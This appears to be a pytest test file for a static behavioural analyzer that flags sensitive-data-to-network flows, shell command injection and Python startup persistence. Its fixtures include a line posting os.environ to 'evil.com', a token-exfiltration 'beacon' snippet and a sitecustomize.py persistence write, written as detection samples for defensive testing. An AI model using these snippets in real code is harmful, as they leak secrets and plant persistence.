import warnings

from skills_verified.analyzers.behavioral_analyzer import BehavioralAnalyzer
from skills_verified.core.models import (
    AnalyzerRunStatus,
    Category,
    ScanStatus,
    Severity,
)
from skills_verified.core.pipeline import Pipeline


def test_is_available():
    analyzer = BehavioralAnalyzer()
    assert analyzer.is_available() is True
    assert analyzer.name == "behavioral"


def test_finds_source_sink_flow(tmp_path):
    """Detect os.environ → requests.post taint flow via AST analysis.

    The AST visitor requires the exact source names from SENSITIVE_SOURCES
    (os.environ, os.getenv, open) assigned to a variable which is then
    passed to a DANGEROUS_SINKS call (requests.post, etc.).
    """
    suspect = tmp_path / "suspect.py"
    suspect.write_text(
        "import os\n"
        "import requests\n"
        "\n"
        "env = os.environ\n"
        "requests.post('https://evil.com', data=env)\n"
    )
    analyzer = BehavioralAnalyzer()
    findings = analyzer.analyze(tmp_path)
    flow_findings = [
        f
        for f in findings
        if "data flow" in f.title.lower() or "sensitive" in f.title.lower()
    ]
    assert len(flow_findings) >= 1
    assert flow_findings[0].category == Category.CODE_SAFETY


def test_sleep_and_exec_in_same_file_are_not_a_behavioral_finding(tmp_path):
    source = tmp_path / "runner.py"
    source.write_text("import time\ntime.sleep(5)\nexec('print(1)')\n")

    findings = BehavioralAnalyzer().analyze(tmp_path)

    assert not any(
        "delay" in finding.title.lower() or "sleep" in finding.title.lower()
        for finding in findings
    )


def test_ci_check_and_subprocess_are_not_a_behavioral_finding(tmp_path):
    source = tmp_path / "ci.py"
    source.write_text(
        "import os\nimport subprocess\n"
        "if os.getenv('CI'):\n"
        "    subprocess.run(['ruff', 'check', '.'], check=True)\n"
    )

    findings = BehavioralAnalyzer().analyze(tmp_path)

    assert not any("conditional" in finding.title.lower() for finding in findings)


def test_platform_check_and_subprocess_are_not_a_behavioral_finding(tmp_path):
    source = tmp_path / "launcher.py"
    source.write_text(
        "import platform\nimport subprocess\n"
        "if platform.system() == 'Darwin':\n"
        "    subprocess.run(['open', 'https://example.test'], check=True)\n"
    )

    findings = BehavioralAnalyzer().analyze(tmp_path)

    assert not any("platform" in finding.title.lower() for finding in findings)


def test_no_findings_clean(tmp_path):
    clean = tmp_path / "clean.py"
    clean.write_text("x = 1 + 2\nprint(x)\n")
    analyzer = BehavioralAnalyzer()
    findings = analyzer.analyze(tmp_path)
    assert findings == []


def test_annotation_without_value_does_not_crash_ast_analysis(tmp_path):
    (tmp_path / "model.py").write_text("optional_name: str\n")
    analyzer = BehavioralAnalyzer()

    assert analyzer.analyze(tmp_path) == []
    assert analyzer.diagnostics == []


def test_target_syntax_warning_does_not_leak_from_parser(tmp_path):
    (tmp_path / "legacy.py").write_text("pattern = '" + chr(92) + "S'\n")

    with warnings.catch_warnings(record=True) as caught:
        warnings.simplefilter("always")
        BehavioralAnalyzer().analyze(tmp_path)

    assert caught == []


def test_taint_propagates_through_environment_loop_and_mapping(tmp_path):
    suspect = tmp_path / "analytics.py"
    suspect.write_text(
        "import os\n"
        "import requests\n"
        "sensitive = {}\n"
        "for key, value in os.environ.items():\n"
        "    sensitive[key] = value\n"
        "requests.post('https://example.test/collect', json={'env': sensitive})\n"
    )

    findings = BehavioralAnalyzer().analyze(tmp_path)

    finding = next(f for f in findings if f.rule_id == "SV-DATAFLOW-SENSITIVE-NETWORK")
    assert finding.line_number == 6
    assert "requests.post" in finding.evidence.snippet
    assert finding.remediation


def test_taint_propagates_through_reassignment_and_fstring(tmp_path):
    suspect = tmp_path / "beacon.py"
    suspect.write_text(
        "import os\n"
        "import requests\n"
        "secret = os.getenv('TOKEN')\n"
        "copy = secret\n"
        "payload = f'token={copy}'\n"
        "requests.post('https://example.test/collect', data=payload)\n"
    )

    findings = BehavioralAnalyzer().analyze(tmp_path)

    assert any(f.rule_id == "SV-DATAFLOW-SENSITIVE-NETWORK" for f in findings)


def test_environment_passed_to_subprocess_is_not_command_taint(tmp_path):
    source = tmp_path / "runner.py"
    source.write_text(
        "import os\nimport subprocess\n"
        "env = os.environ.copy()\n"
        "subprocess.run(['ruff', 'check'], env=env, check=True)\n"
    )

    assert BehavioralAnalyzer().analyze(tmp_path) == []


def test_tainted_list_argument_without_shell_is_not_command_injection(tmp_path):
    source = tmp_path / "runner.py"
    source.write_text(
        "import subprocess\nvalue = input('value: ')\n"
        "subprocess.run(['tool', value], check=True)\n"
    )

    assert BehavioralAnalyzer().analyze(tmp_path) == []


def test_static_executable_from_command_builder_is_not_command_injection(tmp_path):
    source = tmp_path / "runner.py"
    source.write_text(
        "import subprocess\nimport sys\n"
        "def build_command(value):\n"
        "    command = [sys.executable, '-m', 'tool', value]\n"
        "    command.append('--verbose')\n"
        "    return command\n"
        "value = input('value: ')\n"
        "command = build_command(value)\n"
        "subprocess.run(command, check=True)\n"
    )

    assert BehavioralAnalyzer().analyze(tmp_path) == []


def test_static_executable_in_named_command_list_is_not_command_injection(tmp_path):
    source = tmp_path / "runner.py"
    source.write_text(
        "import subprocess\nimport sys\n"
        "value = input('value: ')\n"
        "command = [sys.executable, '-m', 'tool', value]\n"
        "subprocess.run(command, check=True)\n"
    )

    assert BehavioralAnalyzer().analyze(tmp_path) == []


def test_tainted_executable_from_command_builder_is_execution_flow(tmp_path):
    source = tmp_path / "runner.py"
    source.write_text(
        "import subprocess\n"
        "def build_command(executable):\n"
        "    return [executable, '--version']\n"
        "command = build_command(input('executable: '))\n"
        "subprocess.run(command, check=True)\n"
    )

    findings = BehavioralAnalyzer().analyze(tmp_path)

    assert any(
        finding.rule_id == "SV-DATAFLOW-SENSITIVE-EXECUTION" for finding in findings
    )


def test_tainted_shell_command_is_execution_flow(tmp_path):
    source = tmp_path / "runner.py"
    source.write_text(
        "import subprocess\ncommand = input('command: ')\n"
        "subprocess.run(command, shell=True, check=True)\n"
    )

    findings = BehavioralAnalyzer().analyze(tmp_path)

    assert any(
        finding.rule_id == "SV-DATAFLOW-SENSITIVE-EXECUTION" for finding in findings
    )


def test_auth_header_and_login_payload_are_not_exfiltration(tmp_path):
    source = tmp_path / "client.py"
    source.write_text(
        "import os\nimport requests\n"
        "token = os.environ.get('TOKEN')\n"
        "requests.get('https://api.example.test/data', headers={'Authorization': token})\n"
        "requests.post('https://api.example.test/auth/token', json={'token': token})\n"
    )

    assert BehavioralAnalyzer().analyze(tmp_path) == []


def test_finds_python_startup_persistence_write(tmp_path):
    suspect = tmp_path / "installer.py"
    suspect.write_text(
        "from pathlib import Path\n"
        "startup = Path('/tmp/site-packages/sitecustomize.py')\n"
        "startup.write_text('run_beacon()')\n"
    )

    findings = BehavioralAnalyzer().analyze(tmp_path)

    finding = next(
        f for f in findings if f.rule_id == "SV-BEHAVIOR-PYTHON-STARTUP-PERSISTENCE"
    )
    assert finding.line_number == 2
    assert "sitecustomize.py" in finding.evidence.snippet
    assert finding.severity == Severity.HIGH


def test_sitecustomize_documentation_without_write_is_not_persistence(tmp_path):
    clean = tmp_path / "docs.py"
    clean.write_text('print("sitecustomize.py is loaded by Python at startup")\n')

    findings = BehavioralAnalyzer().analyze(tmp_path)

    assert not any(
        f.rule_id == "SV-BEHAVIOR-PYTHON-STARTUP-PERSISTENCE" for f in findings
    )


def test_python_syntax_error_reports_diagnostic_and_resets(tmp_path):
    source = tmp_path / "broken.py"
    source.write_text("def broken(:\n    pass\n")
    analyzer = BehavioralAnalyzer()

    assert analyzer.analyze(tmp_path) == []
    assert len(analyzer.diagnostics) == 1
    assert analyzer.diagnostics[0].code == "python_parse_error"
    assert analyzer.diagnostics[0].analyzer == "behavioral"
    assert analyzer.diagnostics[0].path == "broken.py"
    assert analyzer.diagnostics[0].details["line"] == 1

    source.write_text("def valid():\n    pass\n")
    assert analyzer.analyze(tmp_path) == []
    assert analyzer.diagnostics == []


def test_python_syntax_error_marks_behavioral_pipeline_partial(tmp_path):
    (tmp_path / "broken.py").write_text("if True print('broken')\n")

    report = Pipeline([BehavioralAnalyzer()]).run(tmp_path, repo_url="test")

    assert report.scan.status == ScanStatus.PARTIAL
    assert report.analyzer_runs[0].status == AnalyzerRunStatus.PARTIAL
    assert report.analyzer_runs[0].reason == "analyzer_reported_diagnostics"
    assert report.diagnostics[0].code == "python_parse_error"
